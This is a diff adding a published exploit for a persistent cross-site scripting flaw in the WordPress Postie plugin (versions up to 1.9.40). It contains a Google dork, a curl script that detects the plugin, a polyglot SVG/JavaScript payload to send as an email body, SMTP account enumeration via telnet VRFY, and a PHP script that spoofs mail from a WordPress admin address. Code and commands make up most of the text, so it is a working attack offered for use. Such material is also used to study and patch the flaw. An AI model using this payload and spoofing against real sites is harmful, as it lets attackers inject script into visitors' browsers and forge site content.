@@ -1,0 +1,85 @@
+# Exploit Title: WordPress Plugin Postie 1.9.40 - Persistent Cross-Site Scripting
+# Google Dork: inurl:/wp-content/plugins/postie/readme.txt
+# Date: 2020-01-15
+# Exploit Author: V1n1v131r4
+# Vendor Homepage: https://postieplugin.com/
+# Software Link: https://wordpress.org/plugins/postie/#developers
+# Version: <=1.9.40
+# Tested on: Linux
+# CVE : CVE-2019-20203, CVE-2019-20204
+
+## Identifying WordPress Postie Plugin installation
+
+#!/bin/bash                                                                                                                                                                                                                                     if curl -s -o /dev/null -w "%{http_code}" http://<domain.com>/wp-content/plugins/postie/readme.txt | grep 200 > /dev/null; then                                                                                                                    echo ""                                                                                                                 echo "Postie installed!"                                                                                        else                                                                                                                            echo ""                                                                                                                 echo "Postie seems not to be installed"                                                                         fi  
+
+## Performing persistent XSS using Polyglot JavaScript syntax with crafted SVG (CVE-2019-20204)
+
+# the syntax below should go as email body
+
+jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(You've been hacked)//'>
+
+## Email to post on Postie
+
+- Identifying the mail server
+
+	dig domain.com mx
+
+- enumerating accounts via SMTP
+
+	telnet domain.com 587
+	EHLO buddy
+	mail from:<sender@example.io>
+	rcpt to:<user@domain.com>
+	vrfy user@domain.com
+
+
+- listing accounts via third party software
+
+	You can use these third party software and APIs to enumerate target email users:
+	- https://www.zerobounce.net
+	- https://tools.verifyemailaddress.io/
+	- https://hunter.io/email-verifier
+
+
+
+## Spoofing with PHPMailer
+
+
+<?php
+
+	/* CONFIGURE PHP IF NEEDED */
+	// ini_set("sendmail_from","$fromFull");
+	// ini_set("SMTP","mail.domain.com");
+	// ini_set('smtp_port',587);
+	// ini_set('username',"user");
+	// ini_set('password',"pass");
+
+
+	// COMPOSE
+	$to      = 'postie@domain.com';
+	$subject = 'Title of your post';
+	$message = 'You've been hacked :-)';
+	
+
+	// BASIC HEADER
+	$headers = 'From: wordpress.admin@domain.com' . "\r\n" .
+	   	   	   'Reply-To: wordpress.admin@domain.com' . "\r\n" .
+	    	   'X-Mailer: PHP/' . phpversion();
+	
+	
+	// SEND AND SHOW MESSAGE
+	if (mail($to, $subject, $message, $headers)) echo $headers.'<h1>Mail sent!</h1>';
+	else echo '<h1>Something went wrong...</h1>';
+	
+
+	// FULL HEADER
+	// $headers  = "From: testsite < mail@testsite.com >\n";
+	// $headers .= "Cc: testsite < mail@testsite.com >\n"; 
+	// $headers .= "X-Sender: testsite < mail@testsite.com >\n";
+	// $headers .= 'X-Mailer: PHP/' . phpversion();
+	// $headers .= "X-Priority: 1\n";
+	// $headers .= "Return-Path: mail@testsite.com\n";
+	// $headers .= "MIME-Version: 1.0\r\n";
+	// $headers .= "Content-Type: text/html; charset=iso-8859-1\n";
+
+    ?>
